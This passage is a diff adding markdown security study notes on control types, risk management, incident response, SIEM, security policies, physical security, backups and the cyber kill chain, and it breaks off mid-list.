+## Types of control
+
+- By type
+  - [**Physical controls**](./physical-security.md)
+    - E.g. fences, doors, locks and fire extinguishers
+  - **Technical controls**
+    - Also known as ***logical controls***
+    - E.g. security tokens
+  - **Administrative controls**
+    - E.g. security policies and continuity of operations plans are administrative control
+- By function
+  - **Preventative controls**
+    - Prevents the threat from coming in contact with the weakness
+    - E.g. authentication, encryption (such as [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec))
+  - **Detective controls**
+    - Used after a discretionary event.
+    - E.g. audits, alarm bells, alerts
+  - **Corrective controls**
+    - Put in place after the detective internal controls discover a problem
+    - E.g. backups and restore
+
+## Information Security Management Program
+
+- All activities the organization takes to protect sensitive information
+- E.g. security policies, rules, standards, business resilience, training and awareness, security metrics and reporting.
+
+## Enterprise Information Security Architecture (EISA)
+
+- Regulates organizations structure and behavior in terms of security, processes and employees.
+- Includes requirements, process, principles and models
+- Goals:
+  - Real time monitoring of organization's network
+  - Security breach detection and recovery
+  - Ensuring cost efficiency of security provisions
+  - Helping the IT department to function properly
+    - e.g. with policies and education
+  - Risk assessment of IT assets
+
+### Security management framework
+
+- To reduce risks of any system
+  - Risks are never zero but you should reduce as much as u can
+- Combination of policies, procedures, guidelines and standards
+
+## Defense in Depth
+
+- Also known as **defence in depth**
+- 📝 Using multiple layers for protection
+- Like a tower defence game
+- Provides redundancy in the event a security control fails or a vulnerability is exploited
+- Layers:
+  1. **Policies, Procedures, Awareness**: Data Classification, Risk Management, Code Reviews, Educations...
+  2. **Physical security**: ID cards, CCTV, fences...
+     - Maintenance board should be protected in server room.
+     - Not good in schools, universities etc.
+  3. **Perimeter**: Encryption, identities...
+     - In front of the internal network where traffic in and out is filtered.
+  4. **Internal network**: Network zoning, firewalls...
+  5. **Host**: Antivirus patches, security updates...
+     - Individual devices with networking capability e.g. servers / PCs.
+  6. **Services**: Audit logs, authentication, authorization, coding practices.
+     - Applications running on hosts
+  7. **Data**: Backups, encryption...
+# Risk management
+
+- Ongoing process of identifying, assessing and acting on potential risks.
+- ❗📝 Risk management controls reduce risks but one can never fully eliminate all risk
+  - Nothing is 100% risk-free.
+
+## Risk
+
+- **Risk**
+  - Threat of damage or loss
+- **Risk mitigation**
+  - Also known as **risk reduction**
+  - Taking action to reduce an organization's exposure to potential risks and reduce the likelihood that those risks will happen again.
+- 📝 **Risk equation**
+  - `Risk = Threat x Vulnerability x Asset`
+  - E.g. network is very vulnerable (no firewall), asset is critical: high risk.
+  - E.g. network is well protected, asset is critical: medium risk
+- 📝 **Likelihood**
+  - Likelihood is how probable it is that an event will occur
+- 📝 **Impact**
+  - Estimate of the harm that could be caused by an event
+
+### Types of risks
+
+- 📝 **Inherent risk**
+  - Represents the amount of risk that exists before any controls are taken.
+  - Raw and untreated risk
+- 📝 **Residual risk**
+  - Amount of risk that remains after controls are accounted for.
+- **Control risks**
+  - Risks that occur due to weaknesses in internal controls
+- **Audit risk**
+  - Risk of error while performing an audit.
+  - Three types: Control risk, detection risk, inherent risk
+- **Detection risk**
+  - Verifier does not detect a material misstatement
+
+### Level of risk
+
+- Defined based on events possible consequences to evaluate.
+- **Level of risk equation**
+  - `Consequence x Likelihood`
+
+  | Risk Level | Consequence | Action |
+  | ---------- | ----------- | ------ |
+  | **Extreme / high** | Serious danger | Measures should be immediately taken to reduce the risk |
+  | **Medium** | Medium danger | Measures should be taken as soon as possible |
+  | **Low** | Negligible danger | Preventive measures should be taken to mitigate the risk |
+
+### Risk matrix
+
+- Used to visualize risk probabilities and its consequences
+- Most used method in risk analysis
+- ![Standard risk matrix](img/risk-matrix.png)
+
+### Risk assessment
+
+- 📝 Prioritizes risks based on severity and likelihood of occurrence
+- 📝 Includes an analysis of threats based on the impact to the business
+- E.g. [HIPAA security risk assessment tool](https://www.healthit.gov/topic/privacy-security-and-hipaa/security-risk-assessment-tool) to assess risks regarding: • administrative safeguards • technical safeguards • physical safeguards as defined in [HIPAA rules](./laws-standards-and-regulations.md#hipaa-rules).
+- 💡 Risk assessor should be a trusted entity or contractor
+  - As they'll receive detailed vulnerability information and security architecture information
+
+## Risk management objectives
+
+- Identify the potential risks
+- Identify the impacts of those risks
+- Create risk management strategy and plan
+- Assign priorities to risks
+- Analyze the risks
+- Control the risk
+  - e.g. education, enforcing a policy, changing a software etc..
+- Develop strategies and plans for long lasting risks
+
+## Risk management phases
+
+1. 📝 **Identification**
+   - What? Why? Consequences?
+   - Data gathering activities include • threat identification • vulnerability identification • risk control analysis
+     - Read more [NIST SP 800-39 (NIST Cybersecurity Framework)](https://www.nist.gov/privacy-framework/nist-sp-800-39)
+2. **Assessment**
+   - Likelihood and impact
+3. **Treatment**
+   - Prioritize, order and document.
+   - Manage risks through [risk response types](#risk-responses)
+4. **Tracking and review**
+   - Ensures right actions were taken.
+   - Is action obsolete? Can it be improved? Can cost be decreased?
+
+## Risk responses
+
+- 📝 5 risk responses are: • Avoid • Mitigate • Transfer • Accept • Share
+- **Avoid**
+  - Change the strategy/plan to avoid the risk.
+- **Mitigate**
+  - Take action to reduce the risk.
+  - 💡 You should mitigate the risk to a low enough level so that the residual risk can be accepted as you will never be able to remove all risks.
+- **Transfer**
+  - Transfer risk to another party by e.g. outsourcing or purchasing an insurance.
+- **Accept**
+  - Decide to take the risk, as without risk there's no movement/rewards.
+- **Share**
+  - Distributing the risk, e.g. having two security architects so service can continue if one quits.
+
+## Business continuity and disaster recovery (BCDR)
+
+1. **Risk assessment**
+   - Preparing risk analysis and business impact analysis
+   - See also [risk assessment](#risk-assessment)
+   - E.g. **Disaster recovery risk assessment**
+     - Describes potential risks and their impact to the functioning of an organization.
+     - Describes both natural and man-made disasters and estimates the probability of each scenario occurring
+   - **Business impact analysis (BIA)**
+     - Predicts the consequences of disruption of a business function
+     - Process and gathers information needed to develop recovery strategies
+     - Often includes [Annualized Loss Expectancy (ALE)](#annualized-loss-expectancy-ale) metrics.
+     - Should be used identifying the potential consequences of a change, or estimating what needs to be modified to accomplish a change
+     - 📝 **Business change impact analysis**
+       - Allows you to identify consequences of a change
+       - E.g. a new feature can cause resource load and crash the server.
+2. **Business continuity plan (BCP)**
+   - Covers critical processes recovery
+   - 📝 Includes **Disaster recovery plan (DRP)** describing:
+     - How an organization can quickly resume work after an unplanned incident
+     - What to do to recover
+
+## Annualized Loss Expectancy (ALE)
+
+- Annual cost of a loss due to a risk.
+- Used often in risk analysis and business impact analysis
+- 📝 `ALE = ARO (Annual rate of occurrence) x SLE (Single loss expectancy)`
+- **Annual rate of occurrence (ARO)**
+  - E.g. if it occurs every month than it's 12, if it's every second year than it's 1/2
+- **Single loss expectancy (SLE)**
+  - Total loss value for a single asset after an exploit
+  - `SLE (Single Loss Expectancy) = AV (Asset Value) x EF (Exposure Factor)`
+  - **Asset value (AV)**
+    - How much would it take to replace 1 asset
+    - Including product prices, manhours etc.
+  - **Exposure Factor (EF)**
+    - Percentage of asset value lost if threat is realized
+    - Usually a subjective value
+- E.g. an asset is valued at $100,000, and the Exposure Factor (EF) for this asset is 25%. The single loss expectancy (SLE) then, is 25% * $100,000, or $25,000.
+- **Total cost of ownership (TCO)**
+  - Total cost of a mitigating safeguard
+- **Return on Investment (ROI)**
+  - Amount of money saved by implementing a safeguard.
+  - 💡 Good choice if annual Total Cost of Ownership (TCO) is less than Annualized Loss Expectancy (ALE); poor choice otherwise
+
+## Threat modeling
+
+- Assessment to see how secure an application is
+  - identify the threats
+    - can e.g. use [OWASP top 10](https://owasp.org/www-project-top-ten/) as guideline.
+  - discover application vulnerabilities
+  - improve security
+    - e.g. configure in better way, improve source code, enable encryption or ditch the application.
+- 💡 Do it as soon as and often as possible
+  - E.g. by design phase of the software security development lifecycle (SDL) process
+
+### Threat modeling steps
+
+1. **Identify security objectives**
+   - Understand your integrity, confidentiality, and availability goals
+2. **Application overview**
+   - Understand application and its components (libraries and services), data flows and trust boundaries.
+3. **Decompose application**
+   - Document what each component does, entry and exit points, data flows and trust boundaries.
+4. **Identify threats**
+   - Done for each individual components
+   - E.g. a misconfiguration (e.g. bad password policy, outdated encryption)
+5. **Identify vulnerabilities**
+   - End with vulnerabilities, overall assessment, prioritization of risks.
+
+## Security Development Lifecycle (SDL)
+
+- Set of guidance, best practices, tools, and processes by Microsoft
+- Consists of different phases with different actions on each phase:
+  1. **Training**
+     - Core security training for developers
+  2. **Requirements**
+     - Setting level of security desired
+  3. **Design**
+     - [Threat modeling](#threat-modeling)
+     - Attack surface analysis
+     - Requirements
+  4. **Implementation**
+     - Static analysis
+     - Turning off unsafe functions
+  5. **Verification**
+     - Dynamic analysis
+     - [Fuzz testing](./../14-sql-injection/sql-injection-overview.md#fuzz-testing)
+     - Attack surface reviews
+  6. **Release**
+     - Incident response plan
+     - Final security review
+     - Certification
+  7. **Response**
+     - Allow reporting security problems in products
+# Incident management
+
+- 📝 Process of identifying, prioritizing and solving security incidents.
+- Goal: Restore the system back to normal, trigger alerts to prevent any potential risks.
+- 📝 Steps (flexible, not a strict rule):
+  1. **Preparation for incident handling and response**
+     - You know how you'll handle it when it happens.
+     - Policies, trainings, tools, guidelines...
+  2. **Detection and analysis**
+     - Conduct in-depth analysis to what has happened: why, how, where, what
+  3. **Categorization and prioritization**
+  4. **Notification**
+     - Notify proper people who are affected and who can act on it.
+  5. **Containment**
+     - Prevent the occurring incident from causing more damage.
+     - E.g. put them in quarantine then we'll figure out what to do
+  6. **Forensic investigation**
+     - What happened, why?
+  7. **Eradication**
+     - Wipe the threat completely
+  8. **Recovery**
+     - Restore the system to working state
+  9. **Post-incident activities** (lessons learnt)
+     - Record what happened with final review.
+     - Have discussion about how to avoid it in future.
+- 🤗 E.g. a developer in [Dropbox miscoded](https://www.cnet.com/news/dropbox-confirms-security-glitch-no-password-required/) authentication function to always return true.
+  - Anyone could login as whichever you user you want by just typing their e-mail.
+  - They had review policy but no one paid attention.
+  - They had protocols against major breach.
+  - Realized that it was critical and then they brought down the service to prevent huge damage (containment)
+  - Conducted investigation to see what has happened and started recovery process
+  - It was recorded and documented for current and future employees
+
+## Emergency response plan
+
+- Help companies address various emergency situations that could occur within their organization.
+- Should include who to contact, how to act in an emergency, how to mitigate risk and what resources to use to minimize loss
+
+## Security incident and event management (SIEM)
+
+- Real-time analysis of security alerts generated by network hardware and applications.
+- Helps [SOC](#security-operations-center-soc) to perform its functions
+- 📝 Combines SIM and SEM
+  - **SIM (Security information management)**
+    - Long-term storage as well as analysis and reporting of log data.
+  - **SEM (Security event manager)**
+    - Real-time monitoring
+    - Correlation of events
+    - Notifications and console views.
+- E.g. [Splunk](https://www.splunk.com/) is the most popular SIEM.
+
+### SIEM use-cases
+
+- Anomaly detection could help detect zero-days, misconfigurations, cyberwarfare
+- Automatic parsing, log normalization and categorization
+- Visualization to help with pattern detection
+- Detection of covert, malicious communications and encrypted channels.
+
+### SIEM components
+
+- **Aggregation**: Combining different log data
+- **Correlation**: Using e.g. AI to bundle events with common attributes
+- **Alerting**: Automated analysis of correlated events
+- **Dashboards**: Helps to see anomalies
+- **Compliance**: Can gather compliance data to produce reports that adopt to existing processes
+- **Retention**: Critical in forensic investigations as network breach is high likely discovered after it happens.
+- **Forensic analysis**: The ability to search across logs on different nodes and time periods based on specific criteria.
+
+## Security teams
+
+### Security Operations Center (SOC)
+
+- Centralized function within an organization
+- Continuously monitors and improves an organization's security posture
+- Prevents, detects, analyzes, and responds to cybersecurity incidents.
+- Uses [SIEM](#security-incident-and-event-management-siem) tool to perform its function
+
+### Security Incident Response Team (SIRT)
+
+- Also known as ***CSIRT (Computer Security Incident Response Team)*** or ***Computer Emergency Response Team (CERT)***
+- Focuses on effective and quick incident response.
+- Develops and refines the incident response plan.
+- Typically receive threat intelligence from the [SOC](#security-operations-center-soc)
+- 💡 SIRT should first check effort and potential impact of the incident when begin investigation and response process.
+- There are also national CERT teams such as [US-CERT](https://en.wikipedia.org/wiki/United_States_Computer_Emergency_Readiness_Team) in USA, [CERT-SE](https://www.cert.se/) in Sweden and [TR-CERT](https://www.usom.gov.tr/) in Turkey.
+
+### User Behavior Analytics (UBA)
+
+- Monitoring user behavior in attempt to discover potential threats and attacks.
+- When patterns are observed and normal is established, an admin can take a look at deviations.
+- E.g. monitoring employee behavior against insider threats
+- E.g. login attempts based on the location, monitoring access to privileged accounts.
+# Network security
+
+## Network security controls
+
+- Include: Access control, Identification, Authentication, Authorization, Accounting, Cryptography, Security Policy
+
+### Access control
+
+- Restrictions that determine who has access to what on a system/network.
+- **Physical access control**
+  - Restricts access to physical locations and buildings.
+- **Logical access control**
+  - Restricts the access to networks and information.
+- Terminology
+  - **Subject** = Who's reaching, user or process which accesses the objects
+  - **Object** = What's being reached, resources upon which the restrictions are placed
+  - **Operation** = Verb, What's being done, the action performed by the subject on the object
+  - **Reference Monitor** = implements the rules which define what actions on the object can a subject perform
+- Involves
+  - **Identification**: unique identity in any given system
+    - There are your credentials
+    - e.g. social security number, username and password.
+  - **Authentication**
+    - You're granted access via credentials
+    - You use the credentials
+  - **Authorization**:
+    - What you can access, where you can go, can you park somewhere
+  - **Accounting**
+    - Act of logging and creating account of all actions, what has been done.
+
+## Network security zoning
+
+- Grouping networks for efficient management of networks.
+- Any network has physical firewalls (routers) which has software to act as firewall and control the traffic
+  - However it's hard to manage each network instead best to group them in zones and apply rules in that zone.
+
+### Security zone
+
+- Group of similar people or systems by characteristics e.g. functionalities to apply same rules.
+- Properties include:
+  - Active security policies in regard to the network traffic
+    - E.g. to implement the policy "secretaries cannot reach twitter", can block those sites through firewall rule in their zone
+  - Detection and blocking of malicious traffic
+    - Software needs to actively scan and label what's malicious or not and stop malicious traffic
+  - List of known IP addresses and address sets
+    - IP address of device and interface are different
+  - List of the zone interfaces
+- A device or an interface can can have multiple IP addresses
+  - E.g. wired connection has one interface, another interface to connect to DB
+  - **Maintenance interface**
+    - Last resort to fix stuff
+    - Usually no security boundaries/guards on those interfaces
+    - Must have physical security
+    - E.g. someone goes in to server room in cold jacket codes, plugs in a laptop and uses maintenance interface to fix something.
+
+### Zone examples
+
+- **Internet zone**
+  - Uncontrolled zone out of boundaries of an organization.
+- 📝 **DMZ Zone**
+  - Controlled zone.
+  - Also known as demilitarized zone
+  - Provides a barrier between the external and internal networks.
+  - Included in every router.
+  - Uses firewalls control what can go in and out.
+- **Production zone**
+  - Restricted zone.
+  - Firewalls are used to filter inbound and outbound traffic
+  - Access from uncontrolled networks is strictly controlled.
+- **Intranet zone**
+  - Controlled zone with less restrictions
+- **Management zone**
+  - Secured zone which enforces strict policies and limits access to a few authorized users.
+# Security policies
+
+- Rules and requirements that the system has to have to achieve information assurance.
+- Defines everything about your layout for the employees
+- Written documents including
+  - Lists of allowed hardware and software
+  - Locations for related policies and procedures
+  - Exceptions i.e. exemption rules
+  - Sanctions for noncompliance e.g. disciplinary actions/punishment/termination
+  - ...
+- Types
+  - **Technical policies**: define the system configuration
+  - **Administrative policies**: define the behavior of employees
+- Mitigates risks, prevents something costly from happening.
+- E.g. a good policy is NDA, distributed and cannot be repudiated (signed)
+
+## Policy types for risk tolerance
+
+- 📝 From most permissive to most strict
+  1. [Promiscuous](#promiscuous-policy): No restrictions
+  2. [Permissive](#permissive-policy): If something is malicious it's blocked.
+  3. [Prudent](#prudent-policy): Restrictive
+  4. [Paranoid](#paranoid-policy): Highest restrictions
+
+### Promiscuous policy
+
+- No restrictions on system resources.
+- Do whatever you want
+- 💡 Only good when you have bunch of highly trained & well-informed people with proven track record working in a team because otherwise policies would slow them down
+
+### Permissive policy
+
+- Begins as wide-open, can do anything
+- When it knows something is malicious, it'll be blocked
+
+### Prudent policy
+
+- Provides maximum amount of security
+- Allows only safe stuff
+- Very restrictive
+- A lot of things are locked up
+
+### Paranoid policy
+
+- Something of such high importance, not worth to take smallest of risks, e.g. government data regarding to citizens
+  - E.g. access only from police station, they need to submit why they access, lethal data
+- 🤗 In Linux firewall there's a command called panic that's equivalent to this: Drops all traffic
+
+## Sub-policies
+
+- Policy types are not limited to the listed.
+
+### Password policy
+
+- Guidelines for using strong password protection on available resources.
+- E.g.
+  - At least 8 characters in length
+  - Must include upper/letter/number/symbols
+
+### User account policy
+
+- 📝 Defines the account creation process, authority, rights and responsibility of user accounts.
+- E.g.
+  - Put users in groups and decides what the groups can do.
+  - What needs to be done during account creation
+
+### Information protection policy
+
+- 📝 Guidelines to users on the processing, storage and transmission of sensitive information
+- Goal is to ensure information is appropriately protected from modification or disclosure
+- E.g.
+  - Setting level of sensitivity to information
+  - Dictates who has access to information
+  - Determines how information is stored and transmitted
+  - Describes how information should be deleted from storage media
+
+### Special access policy
+
+- Custom rulings for specific scenarios for specific individuals and services
+- The terms and conditions of granting special access to system resources.
+
+### Email security policy
+
+- Governs the proper usage of corporate email.
+- E.g.
+  - Verify proper signature
+  - Never click on links, because they'll never be sent
+
+### Acceptable use policy
+
+- Same as **Terms of Service** or **Terms of Use**
+- 📝 Description of what constitutes acceptable and unacceptable use of the Internet
+- Code of conduct governing the behavior of a user whilst connected to the network/Internet.
+- E.g.
+  - ISP providers allows you to use unlimited bandwidth
+    - In contract you see it says it's about "fair use"
+    - Fair use can be e.g. to not exceed 50% maximum potential bandwidth that could be used with that bandwidth
+  - Prohibiting port scanning or security scanning
+  - Never revealing a password
+
+### Access control policy
+
+- 📝 Governs resources being protected and the rules that control access to them
+- Who can access what (humans <-> services)
+  - E.g. limited access to routers and switches on top floor
+  - E.g. regulating electric socket placement as someone can connect a Raspberry Pi that can be listening
+- What can access what (services <-> services)
+
+### Remote access policy
+
+- 📝 Defines acceptable methods of remotely connecting to the internal network
+- Applies to both who and what
+- E.g. enforcing VPN, strong passphrases, defining vendor access and requiring monitoring
+
+### Firewall management policy
+
+- Governs access, management and monitoring of firewalls in an organization.
+- Who'll monitor? How will it be monitored?
+- What kind of firewall that'll be used?
+
+### Network connection policy
+
+- Defines who can install new resources on the network, approve the installation of new devices, document network changes etc.
+- Protects both yourself and the company
+- E.g. must always use VPN if not working from office
+
+### Network security policy
+
+- 📝 Outlines rules for computer network access, determines how policies are enforced
+- Governs e.g. • data access • web-browsing habits • use of passwords and encryption • email attachments.
+
+### Encryption policy
+
+- Dictates which encryption to use
+- Goal is to avoid weak and obsolete algorithms
+- Easier if everyone uses same algorithm
+- Used by e.g. cloud providers, ISP providers
+
+### Authentication policy
+
+- Limits ability to be authenticated under some conditions
+- E.g. no coffee shop wireless, only through VPN and using [MFA](identity-access-management-(iam).md#multi-factor-authentication-mfa)
+
+## Implementation
+
+- Steps
+  1. Perform a [risk assessment](./risk-management.md#risk-assessment)
+  2. Utilize standard guidelines
+  3. Include senior management
+  4. Define sanctions
+  5. Distribute the final version
+  6. Ensure that employees have read the policy
+  7. Enforce policies
+  8. Educate and train employees
+  9. Review and update the policy
+- Human Resource department has the responsibility to
+  - educate and train employees in practices defined by the company's security policies
+  - monitor the implementation of the policies
+  - enforce penalties
+
+### Top-down vs Bottom-up
+
+- **Top-down**
+  - Begins with management establishing a framework for initiating and implementing security practices in the enterprise.¨
+  - Most important way to ensure employees across an organization will support and follow the policies
+- **Bottom-up**
+  - Occurs when the system administrators and security personnel try to establish a security program on their own without senior management support and enforcement.
+# Physical security
+
+- The protection of all assets of an organization from all sorts of threats and attacks.
+- Helps in
+  - Preventing unauthorized access to the system
+  - Preventing any kind of data manipulation and theft
+  - Protecting the system against malicious activities such as espionage, damage and theft
+  - Protecting employees and preventing social engineering attacks
+- Categories
+  - **Natural or environmental threats**
+    - E.g. flood, fire, earthquake, dust
+  - **Man-made threats**
+    - E.g. Terrorism, wars, explosions, [dumpster diving](./../10-social-engineering/social-engineering-types.md#dumpster-diving) and theft, vandalism.
+- See also [Physical security | Social engineering](./../10-social-engineering/social-engineering-overview.md#physical-security)
+
+## Types of physical security controls
+
+### Preventive controls
+
+- Implemented before a threat event to reduce or avoid its impact.
+- Includes access control mechanisms to prevent access
+- Can be **technical** e.g.
+  - Firewalls
+  - Authentication systems.
+- Can be **administrative** e.g.
+  - Security policies
+- 📝 Can be **physical** e.g.
+  - Fire extinguishers
+  - Doors e.g.
+    - **Mantrap**
+      - Also known as air lock, sally port or access control vestibule
+      - Has two doors, each door requiring a separate form of authentication to open
+    - **Turnstile**
+      - Also known as a turnpike, baffle gate, automated gate
+      - Allows one person to pass at a time, can enforce one day direction
+      - Can require a a coin, a ticket, a pass, or similar
+      - E.g. in train stations
+  - **Bollard**
+    - Sturdy, short, vertical post
+    - Used for control road traffic and posts
+    - Allows to prevent ram-raiding and vehicle-ramming attacks.
+    - 🤗 Used initially for mooring boats
+
+#### Static electricity
+
+- Low humidity can cause a buildup of static electricity.
+  - Leads to corrosion of the components could.
+  - 💡 Keep humidity level between 45% and 55%.
+- Grounding systems help
+  - E.g. antistatic wrist straps are designed to ground people appropriately
+  - Provides somewhere for any latent static electricity generated to flow.
+
+### Detective controls
+
+- In place to let you know when something has happened or is happening.  
+- Detects violations and intrusion attempts for investigation.
+- E.g. • audit trails and logging • alarm systems • sensors • video surveillance • motion detectors.
+
+### Deterrent controls
+
+- Also known as **deterrence controls**
+- Warns intruders to stay away
+- E.g. signs showing • "Be aware of the dog" • "Under surveillance" • "Authorized personal only"
+
+### Recovery controls
+
+- Used after violation has happened to restore the system to its persistent state
+- E.g. backup systems and disaster recovery
+
+### Compensation controls
+
+- Do not prevent attacks, used when everything else fails
+- Goal is to restore everything back to normal
+- E.g. when there's power shortage you need a grid, alternative energy backing: generators, batteries..
+
+## Physical security measures
+
+- Secure premises and company surroundings
+- Secure the reception area
+- Lock servers and workstations when not in use
+- Lock devices such as modems, removable media, and fax machines when not in use
+- Implement access control
+- Regularly maintain computer equipment
+- Prevent wiretapping
+- Monitor the environment by checking the humidity and temperature
+- Positive pressure is great at keeping contaminants (e.g. dust, dirt) out of the data center
+# Data leakage, backup and recovery
+
+## Data leakage
+
+- Any sort of unauthorized disclosure of sensitive information from anyone/any system.
+- Includes emails, malicious links, device theft etc.
+- Data leakage leads to
+  - loss of trust e.g. trust to governments decreased during late years
+  - loss of profit e.g. Sony lost profit of their movies after [they were leaked](https://en.wikipedia.org/wiki/Sony_Pictures_hack) before publishing
+
+### Data leakage threats
+
+#### External threats
+
+- Corporate espionage, phishing, malware
+- Business partners, consultants when company outsources
+  - Less surveillance than own employees.
+
+#### Internal threats
+
+- Also known as **insider threats**
+- Dangers are greater than external threats as they'll have greater access to the company
+- See also [insider attacks](./security-threats-and-attacks.md#insider-attacks)
+- E.g. eavesdropping, shoulder surfing, [dumpster diving](./../10-social-engineering/social-engineering-types.md#dumpster-diving) can be used to acquire data.
+
+## Data loss prevention
+
+- Also known as **DLP**
+- Identification and monitoring of important information that is not to be shared outside the organization.
+- Can block, notify the sender or lets admins to analyze, react and report to sensitive data in transit.
+- Important tool for enterprise message systems
+- Uses different techniques of data access control
+  - E.g. when e-mailing where content is scanned for fingerprints, classifications and bank account numbers.
+
+## Data backup
+
+- Process of making a duplicate copy of data that already exists.
+- Protects against data loss and corruption as it can lead to great financial damages.
+- No backup = Far more suspectable to all sorts of attacks, especially ransomware.
+
+### Backup mediums
+
+#### Magnetic tapes
+
+- Oldest form, still used by many enterprises.
+- Retention time: ≈30 years
+- 📝 To pull anything off the tape, you have to fast-forward to wherever the correct file is stored
+  - Good for restoring systems in one go.
+  - Bad for incremental backups or storing a few files.
+  - ❗ Only way to tell if backups are working is to fully restore from the tape and check if it's correctly restored.
+
+#### Optical disks
+
+- 2 to 3 times slower than hard drives
+- Retention time: ≈25 years
+
+#### Hard disks
+
+- Cheaper, easily accessible
+- Less stability than magnetic tapes
+- Retention time: ≈9-20 years
+
+#### SSD disks
+
+- Includes also usb drives known as Flash storage or thumb-drive.
+- Resistant to shock, temperature, being run through the washing machine
+- Retention time: ≈10 years
+
+#### Cloud storage
+
+- Requires little infrastructure
+- Depends on stable internet connection
+- No retention time, high reliability
+
+#### SD and micro-SD
+
+- Little capacity and pricy.
+- Retention time: ≈10 years
+
+### Steps of data backup strategy
+
+1. **Identify important data**
+   - because backing-up everything is too costly and takes up much storage.
+2. **Choose appropriate backup media**
+   - Reliable, solid, preferably cheap
+   - E.g. USBs or portable media for personal users, and HDD/SDDs for companies for more speed.
+3. **Choose the appropriate backup strategy**
+   - Check features such as scheduling, monitoring file changes to update back-ups, protocols, integrations...
+   - Paid vs Free
+     - Free requires more knowledge and work, training costs (one time)
+       - E.g. in Linux, set cron job from point A to B
+     - Paid versions has recurring license costs including training
+4. **Choose appropriate RAID levels**
+   - **RAID 1**
+     - 2 disks
+     - All that are written in disk A is also written to B, if one disk fails, other works
+   - **RAID 5**
+     - 3 disks
+     - If A fails you can reconstruct based on data in B and C
+   - RAIDing is not only for backups, can also use for faster read and writes
+     - E.g. BIG = Everything is seen as one drive. File is written two all of them. Crazy write & read speeds. If single disk dies all data is gone.
+5. **Choose the appropriate backup method**
+   - **Cold backup**
+     - Performed while system is not in use.
+     - E.g. at nights, during weekends.
+   - **Hot backup**
+     - Performed when system is still used.
+     - E.g. you type a document, power shortage happens but it's still saved.
+   - **Warm backup**
+     - Hybrid of the two.
+     - Period backups while system is in use, but you might lose longer time period than hot backup.
+6. **Choose the appropriate backup locations**
+   - Three options:
+     1. **On-site**: Same building / room
+        - Susceptible to same types of problems like other servers.
+        - If there's a breach, fire or earthquake = all data are gone
+     2. **Off-site**: backup is performed at a remote location
+     3. **Cloud**:
+        - Most secure: most cost effective and safe where data won't be loss, no electricity, no hardware, no maintainable.
+        - Can be replicated in same building, different buildings in same data center or different regions.
+        - Can have privacy/trust issues: encrypt
+7. **Choose the backup type**
+   - **Full backup**: Costly, you back up everything
+   - **Incremental backup**
+     - Backs-up on each change of the previous back-up
+     - When restoring, you need to restore everything from the first full back-up
+   - **Differential backup**:
+     - Back-ups on difference to the initial backup on each backup.s
+     - Faster restoring time as you only need the last point and the initial full back-up
+8. **Appropriate backup solution**: Combination of all of this
+9. **Perform a recovery test**
+   - Ensure you can recover a data that's lost with DR tests e.g. twice a year.
+   - **Recovery drill**
+     - Simulating data tier outage
+     - Recovering
+     - Validate application integrity post recovery
+
+## Data recovery
+
+- Recovering lost data
+- Reasons
+  - Accidental lost e.g. • natural disaster • corrupted data
+  - Or can be intentionally destroyed
+- DR stands for "Disaster Recovery"
+- Most of data is recoverable but you can have recovery failure if backed up data becomes corrupt.
+# Threat intelligence and forensics
+
+## Cyber kill chain
+
+- Framework for identification and prevention of cyber intrusions activity.
+- Developed by [Lockheed Martin](https://www.lockheedmartin.com/)
+- Identifies what the adversaries must complete in order to achieve their objective.
+- 🤗 Based on military kill chains, a concept consisting of • target identification • force dispatch to target decision • order to attack the target • the destruction of the target
+- 🤗 Critiques states it only defends "perimeter" and isn't suitable model to insider threats.
+- E.g. [A "Kill Chain" Analysis of the 2013 Target Data Breach](https://www.commerce.senate.gov/services/files/24d3c229-4f2f-405d-b8db-a3a67f183883)
+
+### Cyber kill chain steps
+
+- ❗ Not same in every organization as different organizations have constructed their own kill chains to try to model different threats
+
+1. **Reconnaissance**
+   - Collecting as much as information about the target.
+   - E.g. harvesting email addresses, conferece information etc.
+   - See also [footprinting](./../02-footprinting/footprinting-overview.md)
+2. **Weaponization**
+   - Analyzing collected data to identify and vulnerabilities to exploit to gain access
+   - E.g. creating a [phishing](./../10-social-engineering/social-engineering-types.md#phishing) campaign based on collected data
+3. **Delivery**
+   - Weaponized bundle to the victim via email, web, USB, etc.
+   - Key to measure the effectiveness of the defense strategies implemented by the target.
+   - E.g. sending [phishing](./../10-social-engineering/social-engineering-types.md#phishing) emails
+4. **Exploitation**
+   - Execute code on victim's system.
+   - E.g. arbitrary code execution, authentication and authorization attacks
+5. **Installation**
+   - Installing malware on the asset
+   - E.g. [backdoor](./../07-malware/malware-overview.md#backdoor) to gain remote access and maintain access in the network
+6. **Command and control**
+   - Allows remote manipulation/exploation of victim
+   - Done by establishing two-way communication between the victim and the attacker.
+   - Evidence is usually hidden using [encryption techniques](./../15-cryptography/encryption-algorithms.md)
+7. **Actions on objectives**
+   - With hands-on access, intruders accomplish their original goals.
+   - E.g. • distrupting network • gaining access to confidential data
+
+### Defensive courses of action
+
+1. **Detect**: determine whether an attacker is poking around
+2. **Deny**: prevent information disclosure and unauthorized access
+3. **Disrupt**: stop or change outbound traffic (to attacker)
+4. **Degrade**: counter-attack command and control
+5. **Deceive**: interfere with command and control
+6. **Contain**: network segmentation changes
+
+## Threat identification
+
+### Tactics, Techniques, and Procedures (TTPs)
+
+- Concept in terrorism and cyber security studies
+- Identifies patterns of behavior of the threat actors (= bad guys)
+- Aids in
+  - counterintelligence for threat prediction and detection
+  - implementing defenses
+  - profiling threat actors e.g. [APT groups](security-threats-and-attacks.md#advanced-persistent-threats-apt)
+- E.g. In [2020 United States federal government data breach](https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach), used TTP were stealing SAML tokens to attack [SSO](identity-access-management-(iam).md#single-sign-on-sso) infrastructure according to [TTP analysis from NSA](https://media.defense.gov/2020/Dec/17/2002554125/-1/-1/0/AUTHENTICATION_MECHANISMS_CSA_U_OO_198854_20.PDF).
+- Read more at [NIST Special Publication 800-159](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-150.pdf)
+
+#### Tactics
+
+- Also called **tools** in the acronym
+- Highest-level description of the behavior
+- Describes ways attacker attacks from start to end
+- E.g.
+  - Way of gathering information e.g. [open-source intelligence](./../02-footprinting/footprinting-overview.md#open-source-intelligence-osint), [social engineering](./../10-social-engineering/social-engineering-overview.md).
+  - Way of initial compromise e.g. tools, zero-day vulnerabilities, obfuscation methods
+
+#### Techniques
+
+- Technical methods used by an attacker
+- Gives a more detailed description of behavior in the context of a [tactic](#tactics).
+- E.g.
